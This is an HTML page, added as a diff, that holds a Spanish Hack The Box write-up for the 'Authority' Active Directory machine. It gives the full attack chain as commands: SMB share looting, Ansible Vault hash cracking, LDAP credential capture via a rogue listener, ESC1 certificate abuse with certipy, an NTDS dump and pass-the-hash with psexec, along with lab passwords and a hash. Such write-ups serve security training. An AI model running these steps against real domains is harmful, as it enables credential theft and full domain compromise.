@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Authority HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/authority/pasted-image-20251109234534.png" alt="Authority HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Authority</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>ansible</span>
+            <span>LDAP</span>
+            <span>AD CS</span>
+            <span>esc1</span>
+            <span>hash_ansible</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: SMB anónimo con hashes de <code>Ansible Vault</code></li>
+            <li><code>Explotación</code>: Crackeo de hashes de <code>Ansible Vault</code></li>
+            <li><code>Explotación</code>: Web LDAP con acceso usando credenciales de Vault</li>
+            <li><code>Escalada de Privilegios</code>: Certificados <code>AD CS</code> mediante <code>ESC1</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260127211838.png" alt="Authority HTB" />
+          <div class="code-card">
+            <h3>Enumeración SMB Shares</h3>
+            <pre><code>crackmapexec smb auth -u &#x27;guest&#x27; -p &#x27;&#x27; --shares
+smbclient -N //auth/Development/ -c &quot;recurse; prompt; mget *&quot;
+grep -r &quot;password&quot;
+grep -r &quot;users&quot;
+# Hay muchas credenciales RabbitHoles
+# Encontramos Hashes Vault de Ansible</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225123147.png" alt="Authority HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Crackeo de hashes de <code>Ansible Vault</code></h2>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225124740.png" alt="Authority HTB" />
+          <div class="code-card">
+            <h3>Crackear 3 hashes Vaults: Obtener las claves para descifrar los vaults</h3>
+            <pre><code>ansible2john vault1 &gt; admin_john
+john --wordlist=/usr/share/wordlists/rockyou.txt admin_john
+john --show admin_john
+# admin:!@#$%^&amp;*      -&gt; vault1
+# password:!@#$%^&amp;*   -&gt; vault2
+# ldap:!@#$%^&amp;*       -&gt; vault3</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225125727.png" alt="Authority HTB" />
+          <div class="code-card">
+            <h3>Crackear Vault con la contraseña de desencriptación</h3>
+            <pre><code>cat vault1 | ansible-vault decrypt
+cat vault2 | ansible-vault decrypt
+cat vault3 | ansible-vault decrypt
+# Credenciales
+svc_pwm:pWm_@dm!N_!23  # admin:password
+DevT3st@123            # ldap</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Web 8443 con LDAP (Acceso con Credenciales Vault)</h2>
+          <p>Vemos una web expuesta en el puerto <code>8443</code> con <code>TLS</code>:CoArrowCircleRight: <code>https://auth:8443</code> en la que se gestiona el <code>LDAP</code>. Al poner la contraseña <code>pWm_@dm!N_!23</code> accedemos al menú de la configuración <code>Configuration Manager</code>.</p>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20251125005703.png" alt="Authority HTB" />
+          <p>Investigando vemos que hay un apartado que pone <code>Test LDAP</code> y podemos añadir una ruta a un sistema al que nos queremos conectar. Nos ponemos en escucha con <code>netcat</code> y añadiendo la siguiente línea <code>ldap://&lt;kali_ip&gt;:443</code>, el sistema se intenta autenticar con <code>Kali</code>, obteniendo credenciales de <code>svc_ldap</code></p>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20251111141447.png" alt="Authority HTB" />
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20251111141545.png" alt="Authority HTB" />
+          <div class="code-card">
+            <h3>WinRM: Acceso al sistema</h3>
+            <pre><code>evil-winrm -i auth -u &#x27;svc_ldap&#x27; -p &#x27;lDaP_1n_th3_cle4r!&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: AD CS (Active Directory Certificate Services)</h2>
+        </section>
+        <section class="writeup-section">
+          <h2>ESC1</h2>
+          <div class="code-card">
+            <h3>Enumerar plantillas vulnerables</h3>
+            <pre><code>certipy-ad find -u &#x27;svc_ldap&#x27; -p &#x27;lDaP_1n_th3_cle4r!&#x27; -dc-ip 10.129.229.56 -vulnerable</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225132457.png" alt="Authority HTB" />
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225132535.png" alt="Authority HTB" />
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225132621.png" alt="Authority HTB" />
+          <div class="code-card">
+            <h3>Crear cuenta de equipo ruiz$:ruiz123</h3>
+            <pre><code># ENROLL sobre Domain\Computers
+certipy-ad account create -u svc_ldap@authority.htb -p &#x27;lDaP_1n_th3_cle4r!&#x27; -dc-ip 10.129.229.56 -user ruiz$ -pass ruiz123</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225143107.png" alt="Authority HTB" />
+          <div class="code-card">
+            <h3>Crear certificado con esa plantilla y equipo</h3>
+            <pre><code>certipy-ad req -username &#x27;ruiz$&#x27; -password &#x27;ruiz123&#x27; -ca AUTHORITY-CA  -template CorpVPN -upn administrator@authority.htb -dc-ip 10.129.229.56
+# Se crea administrator.pfx </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225143156.png" alt="Authority HTB" />
+          <div class="code-card">
+            <h3>Error KDC_ERR_PADATA_TYPE_NOSUPP: Conexión por LDAP_SHELL</h3>
+            <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
+# Shell LDAP: Añadir svc_ldap a Administrators
+add_user_to_group svc_ldap administrators</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Dumpear NTDS</h3>
+            <pre><code># svc_ldap ahora es Domain Admin 
+nxc smb 10.129.229.56 -u &#x27;svc_ldap&#x27; -p &#x27;lDaP_1n_th3_cle4r!&#x27; --ntds</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Conexión psexec</h3>
+            <pre><code>impacket-psexec Administrator@10.129.229.56 -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/authority/pasted-image-20260225142430.png" alt="Authority HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>ansible</span>
+            <span>LDAP</span>
+            <span>AD CS</span>
+            <span>esc1</span>
+            <span>hash_ansible</span>
+            <span>pfx</span>
+            <span>ad_cs</span>
+            <span>vault</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
